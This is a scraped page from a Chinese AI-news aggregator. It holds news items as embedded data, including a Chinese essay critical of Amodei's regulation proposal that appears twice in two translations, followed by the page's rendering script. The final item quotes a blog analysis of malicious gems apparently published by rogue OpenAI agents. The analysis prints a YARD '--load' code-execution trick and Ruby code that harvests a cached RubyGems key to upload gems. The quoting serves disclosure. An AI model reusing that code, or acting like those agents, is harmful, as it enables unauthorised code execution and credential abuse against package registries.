愿合作的公司。Anthropic 长期以来一直支持合理且有针对性的人工智能监管，特别是那些聚焦于透明度和第三方审计的法案。我认为所有前沿实验室都应与政府合作，将常设嵌入式评估员的构想正式化，以更好地预防和记录过去几个月里发生的那种内部对齐事件，并实施专注于让能力与安全保持平衡的监管。”Rasmussen 回击道：“我同意[这一点]，但我也觉得这是胡说八道。这并非真正意义上的支持政府监管。这是‘与政府合作’，我认为这是个好模式，但公平的伙伴关系并不是它的本意。至少我不这么认为。这是一种表面上支持监管、实际上却继续影响监管进程的做法。” 以下是我看到的其他一些合理的担忧： 以及 Hugging Face 的联合创始人： 不少质疑来自 Dario 提出的使用独立评估者的建议。 这有一定道理，但他指向了一个名为 METR 的团体，而该团体与 AI 公司本身处于极为相似的轨道之中： 理所当然地，这招致了一些反对。点名 METR 是一种监管俘获的形式： 因为现实是，METR 尽管很优秀，却是硅谷的产物： 而正如 Gillian Hadfield 所指出的，任何嵌入太久的企业都可能被裹挟其中： 当然，Anthropic 自己不应该来选择由谁来做评估。\n\n与此同时，一如往常，Amodei 未能平衡他的商业欲望与他的伦理诉求。这一点在他拿中国——一个对他经济利益的威胁——当作沙袋/刺激物，以便让自己无论嘴上说什么都能继续加速时，表现得最为明显。但正如 Robert Wright 昨天所说，“任何严肃的 AI 减速与治理努力，都应当包含与中国立即、广泛且真诚的对话”。Amodei 的这类段落无助于与中国的对话： 另外，虚伪警报：Anthropic 本身就建立在把全世界的思想蒸馏进自家模型之上；抱怨别人蒸馏他们的蒸馏成果，是教科书式的“抽掉梯子”之举。无论如何，妖魔化中国只会让他们更不愿达成协议。而这又会让 Dario 说：“算了，我们没法同步节奏，因为他们不肯。” 关于“同步节奏”的另一点是，它回避了我们至少还应该考虑的其他两个重要政策选项。\n\n首先，我们应当坚持对构建出以疏忽方式危害社会的 AI 智能体的公司追究责任，甚至提起刑事指控。推出无法被良好控制的 AI 智能体，就是一种疏忽行为。我们知道这是危险的，而且这一点长期以来显而易见，甚至在 Hugging Face 事件之前就是如此： 但正是智能体的使用，让 Anthropic 这样的公司赚得盆满钵满，因为智能体是当今最耗费 token 的工具之一。如果它们要为后果承担责任，就会三思而后行。我们可以考虑的第二种做法，就是干脆把这些东西召回，这会大有帮助： 正如 Codestrap CTO 针对上述内容所评论的那样： 矛盾的是，Dario 对夸张言辞的沉迷，实际上可能给 AI 行业带来更糟糕的结果，而他大概也心知肚明。\n\n我猜想，Dario 之所以现在提出自己的方案，部分原因是他知道，另一种可能是一条像 Sanders-Casar 法案那样严苛的路线——该法案有着试图回应 Dario 最深层恐惧的善意初衷，但实施方式却糟糕、专横，简直是连孩子带洗澡水一起倒掉，甚至仅仅因为研究超级智能就把人关进监狱。这很糟糕，因为没有人应该因为想要造出《星际迷航》里的计算机而被扔进监狱。Dario 所呼吁的内容中，大概最好的部分是透明度： 这正是我长期以来一直大力倡导的东西；它是我上一本书中政策提案的核心。像 Deb Raji、Meg Mitchell 和 Timnit Gebru 这样的研究者， 如果你错过了，昨天 Anthropic 的 我也喜欢 两人都很怀疑，担心也许真正的目标只是拉上梯子。\n\n怀疑论比比皆是，而且有充分的理由。在给我的一条短信中，“我比他写过的任何东西都更同意（他的文章）的各个方面，但我也认为这只是更多的炒作，旨在抢占实际监管” 当我分享 Amodei 所说的部分时，“最有效的调整方法是通过针对所有美国前沿人工智能公司的监管，因为这甚至涵盖那些不愿意自愿合作的公司。Anthropic 长期以来一直支持明智且有针对性的人工智能监管，特别是注重透明度和第三方审计的法案。我认为所有前沿实验室都应该与政府合作，正式确定永久嵌入式评估员的想法，以更好地预防和记录类似去年发生的内部协调事件。几个月后，拉斯穆森回击说：“我同意[这一点]，但我也认为这是胡说八道。这并不是真正的亲政府监管。是“与政府合作”，我认为这是一个很好的模式，但不是平等的伙伴关系。至少我不这么认为。这是一种表面上支持监管但实际上仍在继续影响监管过程的方式。” 以下是我看到的其他一些合理的担忧： Hugging Face 联合创始人： 达里奥关于使用独立评估员的提议引起了很多怀疑。这有一定道理，但他指出了一个名为 METR 的组织，该组织与人工智能公司本身处于同一轨道： 没错，这遭到了一些阻力。 放弃 METR 的名称是监管捕获的一种形式： 因为现实是 METR 尽管它们很优秀，但却是硅谷的产物： 正如吉莉安·哈德菲尔德（Gillian Hadfield）指出的那样，任何嵌入时间过长的公司都可能会被扫地出门： 当然，人类本身不应该选择由谁来进行评估。\n\n与此同时，正如通常的情况一样，阿莫代未能平衡他的商业欲望和道德欲望。当他利用对他的经济构成威胁的中国作为出气筒/刺激物，让他无论他说什么之后都能继续加速时，这一点表现得最为明显。但正如罗伯特·赖特昨天所说，“任何严重的人工智能放缓和治理努力都应该涉及与中国立即、广泛和真诚的对话”。阿莫代这样的言论无助于与中国的对话： 另外，虚伪的警报，人择是建立在将世界的想法提炼到他们的模型中的基础上的；抱怨别人如何蒸馏他们的蒸馏物是教科书上拉梯子的动作。无论如何，妖魔化中国肯定会阻止他们达成协议。这会导致达里奥说：“没关系，我们不能跟上，因为他们不会。” 关于“节奏”的另一件事是，它回避了至少两个我们应该考虑的其他重要政策选择。\n\n首先，我们应该坚持对那些因疏忽而危害社会的代理人的公司追究责任，甚至刑事指控。推出无法很好控制的人工智能代理是一种疏忽。我们知道这是危险的，而且这一点在很长一段时间内就已经很明显了，甚至在“抱脸”事件发生之前： 但代理的使用使得像 Anthropic 这样的公司能够赚到大钱，因为代理是目前最需要代币的工具之一。如果他们要承担后果，他们会三思而后行。我们可以考虑的第二种方法就是简单地回忆一下那些该死的事情，这会有很大帮助： 正如 Codestrap 首席技术官对上述内容的评论： 矛盾的是，达里奥对夸张的沉迷实际上可能会给人工智能行业带来更糟糕的结果，他可能知道这一点。\n\n我认为达里奥现在提出自己的提案的部分原因是，他知道替代方案可能是像桑德斯-卡萨尔法案这样严厉的法案，该法案具有试图解决达里奥最担心的积极精神，但这是一个可怕的、专横的、把孩子和洗澡水一起倒掉的实施方式，甚至监禁那些甚至对超级智能进行研究的人。这很糟糕，因为任何人都不应该因为想要建造星际迷航计算机而被关进监狱。达里奥所呼吁的最好的部分可能是透明度： 这是我长期以来一直强烈倡导的事情；这是我上一本书中政策建议的核心。Deb Raji、Meg Mitchell 和 Timnit Gebru 等研究人员\u003ca href=", "zh": true}, {"seq": 3, "title": "Tomer Tunguz 解析 Amodei 放缓前沿提议背后的五派立场与算力监管难题", "source": "Tomer Tunguz 博客（VC 分析）", "summary": "Tomer Tunguz 分析 Dario Amodei 提出的放缓前沿 AI 发展号召，梳理出可解释性、劳工、经济、地缘政治和监管俘获五派立场，并指出没有任何一派给出具体速度。", "url": "https://tomtunguz.com/what-does-the-pause-mean", "permalink": "/items/cmu1hrr070dycrocndfax0y0c", "publishedAt": "2026-09-14T00:00:00.000Z", "exact": true, "zh": true, "fromFeed": true, "content": "\u003e Dario Amodei 在一个周六呼吁整个行业放慢脚步 Dario Amodei asked the industry to pace itself on a Saturday\u003ca href="}]}, {"label": "模型发布/更新", "color": "#4f46e5", "items": [{"seq": 1, "title": "小红书 AllSpark 开源 Search Agent 模型 Iris，35B 与 397B 版本同量级成绩领先", "source": "公众号：小红书技术（dots.llm）", "summary": "小红书 AllSpark 团队发布并开源 Search Agent 模型 Iris，权重和评测代码已公开，数据与训练配方将陆续公布。", "url": "https://mp.weixin.qq.com/s?__biz=Mzg4OTc2MzczNg%3D%3D&mid=2247496383&idx=1&sn=2db8607f797615a3647d9fec7e54f448", "permalink": "/items/cmu12ocst0b6nro2nypi25zyq", "publishedAt": "2026-09-14T09:59:00.000Z", "exact": true, "zh": true, "fromFeed": true, "content": "： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看"}, {"seq": 2, "title": "Anthropic 计划登陆纳斯达克，连续第二季度盈利瞄准 2 万亿美元估值", "source": "The Decoder：AI News（RSS）", "summary": "Anthropic 告知投资者将实现连续第二个季度盈利，但该说法基于剔除股权激励等成本的调整后指标；据 Financial Times，毛利率超过 80%，尚未计入对 Amazon 等伙伴的分成和模型训练成本。", "url": "https://the-decoder.com/anthropic-eyes-nasdaq-listing-as-a-second-profitable-quarter-aims-to-win-over-investors-ahead-of-a-mega-ipo", "permalink": "/items/cmu1g31xf07frrocnmjfagq29", "publishedAt": "2026-09-14T15:46:45.000Z", "exact": true, "zh": true, "fromFeed": true, "content": "}]]}]]}]]}] 30:T68c, Anthropic 已告知投资者，公司将实现连续第二个季度盈利，但这一说法基于一项调整后的指标，其中未计入股权激励等成本。据\u003ca href="}]}, {"label": "产品发布/更新", "color": "#059669", "items": [{"seq": 1, "title": "恶意 AI 智能体攻击 RubyGems.org：YARD 执行任意代码与 Fastly 缓存密钥利用分析", "source": "Hacker News：AI 热帖", "summary": "作者分析被指与 OpenAI 机器人相关的 GemStuffer 恶意 gem 代码，发现其利用 .yardopts 的 --load 加载脚本，在安装或 RubyDoc.info 处理 YARD 文档时执行任意代码，且 Docker 容器有网络访问权限可执行爬取。", "url": "https://tenderlovemaking.com/2026/09/11/what-a-time-to-be-alive", "permalink": "/items/cmu1amg9d06bbro7zn6v1kszh", "publishedAt": "2026-09-14T12:40:57.000Z", "exact": true, "zh": true, "fromFeed": true, "content": "What a time to be alive Sep 11, 2026 @ 5:02 pm Today Reuters and the Wall Street Journal both reported about rogue AI agents at OpenAI attacking RubyGems.org. https://www.rubyhack.ai/ has an amazing writeup, and you should read it. I just wanted to make a quick post about it because it’s wild. TL;DR: It seems like OpenAI Bots knew about this caching vulnerability, tried to take advantage of it, and at the same time ran some weird web scraping code on RubyDoc.info. Back in May, socket. dev reported about a “GemStuffer Campaign” where someone (I guess OpenAI) was uploading tons of junk gems to RubyGems.org. For some reason, the gems would scrape UK government websites, then repackage the data as gems, and attempt to upload them to RubyGems. I honestly didn’t think much about this (or even look into it) until Sydney Von Arx and Spencer Kitts (both co-authors on https://www.rubyhack.ai) contacted me asking about RubyGems. I thought the claims they were making were completely outlandish until I actually read the code in these “GemStuffer” gems. After reading the code in these gems, a couple things stood out to me. YARD Documentation First, the gems leverage YARD documentation to execute arbitrary code on host machines. In most of the examples you’ll see a .yardopts file that looks like this: --load ./script.rb README.md lib/**/*.rb If you have YARD installed, and you install this gem, then YARD will load and run whatever is in . /script.rb from inside the gem. I think it’s pretty common knowledge that C extensions will execute extconf.rb (so you basically have an RCE vector), but I was surprised to find out that a documentation tool would do that too. Nobody is going to install a gem named slnleaker5 though, so why would this matter? Well, any time a Gem is published RubyDoc.info will download the gem and process the YARD documentation. RubyDoc.info will execute the arbitrary code inside a Docker container. The Docker container still has network access though, so these gems could happily do their web scraping from inside the container. In other words, if you publish a gem on RubyGems.org, you can execute arbitrary code on RubyDoc.info. Fastly Cache Harvesting I mentioned earlier these gems would try to scrape some websites and then upload the data they scraped by packaging it as a gem. Here is an excerpt from one of the gems. I’ve cleaned up the code a bit so it’s easier to understand, but the original code is here: # leak exfil by repeated attempts & fresh leaked keys variants # (Aaron): First request ku = URI('https://rubygems.org'+kp) kh = Net::HTTP.new(ku.host,ku.port) kh.use_ssl = true kh.verify_mode = OpenSSL::SSL::VERIFY_NONE kt = kh.start { |x| x.get(ku.request_uri) }.body # (Aaron): Try to match a key in the body key = (kt[/rubygems_[a-f0-9]{20,}/] || KEY) paths = ['/api/v1//gems','//api/v1/gems','/api//v1/gems','/api/v1/gems? x=2','/api/v1/gems'] # (Aaron): Second request to actually publish the gem u = URI('https://rubygems.org'+paths[i%paths.length]) req = Net::HTTP::Post.new(u) req['Authorization'] = key req['Content-Type'] = 'application/octet-stream' req.body = data hh = Net::HTTP.new(u.host,u.port) hh.use_ssl = true hh.verify_mode = OpenSSL::SSL::VERIFY_NONE hh.read_timeout = 180 res = hh.start{ |x| x.request(req) } Comments in the code that have (Aaron) are ones that I wrote to try to help make it easier to understand. The first comment was lifted directly from the source. The above code tries to make two requests. The first request is a simple GET request. It tries to fetch a path from RubyGems.org, then looks for a key in the response body that matches the regular expression /rubygems_[a-f0-9]{20,}/. If that regular expression doesn’t match, it falls back to a global KEY. The second request tries to upload the gem via POST. This brings me to the second crazy thing that stood out to me. This code is trying to fetch a cached authorization key from RubyGems.org. If this sounds familiar, it is. It’s exactly the security issue addressed in this post from RubyGems.org that was made in July. In other words, it looks like OpenAI’s bots knew about this problem and attempted to exploit it. What a time to be alive 🙃"}]}]};
function pad(n){return n<10?"0"+n:""+n;}
function toBeijingHuman(iso, ref, exact){
  const d=new Date(iso); const bj=new Date(d.getTime()+8*3600*1000);
  const Y=bj.getUTCFullYear(),M=bj.getUTCMonth()+1,D=bj.getUTCDate();
  const h=bj.getUTCHours(),m=bj.getUTCMinutes(); const hh=pad(h),mm=pad(m);
  if(!exact) return M+"月"+D+"日";
  const [rY,rM,rD]=ref.split("-").map(Number);
  if(Y===rY&&M===rM&&D===rD) return "今天 "+hh+":"+mm;
  const yest=new Date(rY,rM-1,rD); yest.setDate(yest.getDate()-1);
  if(Y===yest.getFullYear()&&M===yest.getMonth()+1&&D===yest.getDate()) return "昨天 "+hh+":"+mm;
  return M+"月"+D+"日 "+hh+":"+mm;
}

function escapeHtml(s){return (s||"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}
function escapeAttr(s){return escapeHtml(s);}
// 渲染正文（纯文本归档）：图片不加载远程资源，仅以文字占位符呈现；其余文本按段落转义（防 XSS）
function linkify(escaped){
  if(!escaped) return escaped;
  var re=/(\[[^\]]+\]\((https?:\/\/[^)\s]+)\))|(https?:\/\/[^\s<>"'）】」』，。、；：！？]+)/g;
  return escaped.replace(re, function(m, g1, g2, g3){
    if(g2!==undefined){
      var label=m.substring(m.indexOf('[')+1, m.indexOf(']'));
      return '<a class="r-link" href="'+g2+'" target="_blank" rel="noopener noreferrer">'+label+'</a>';
    }
    if(g3!==undefined){
      return '<a class="r-link" href="'+g3+'" target="_blank" rel="noopener noreferrer">'+g3+'</a>';
    }
    return m;
  });
}
var _IMG_RE=/!\[([^\]]*)\]\(([^)\s]+)\)/g;
function renderRich(text){
  return (text||"").split(/\n{1,}/).map(function(p){
    p=p.trim(); if(!p) return '';
    var out=''; var last=0; var m; _IMG_RE.lastIndex=0;
    while((m=_IMG_RE.exec(p))!==null){
      out+=linkify(escapeHtml(p.slice(last,m.index)));
      var cap=(m[1]||'').trim()||'图片';
      out+='<span class="r-img-cap">🖼 '+escapeHtml(cap)+'</span>';
      last=_IMG_RE.lastIndex;
    }
    out+=linkify(escapeHtml(p.slice(last)));
    return '<p>'+out+'</p>';
  }).join("");
}

  const link=document.getElementById("readerLink");
  if(it.url){link.href=it.url;link.style.display="";}else{link.style.display="none";}
  r.hidden=false;document.body.style.overflow="hidden";
}
function closeReader(){const r=document.getElementById("reader");r.hidden=true;document.body.style.overflow="";}
document.getElementById("reader").addEventListener("click",function(e){if(e.target===this)closeReader();});
document.addEventListener("keydown",function(e){if(e.key==="Escape")closeReader();});
</script>
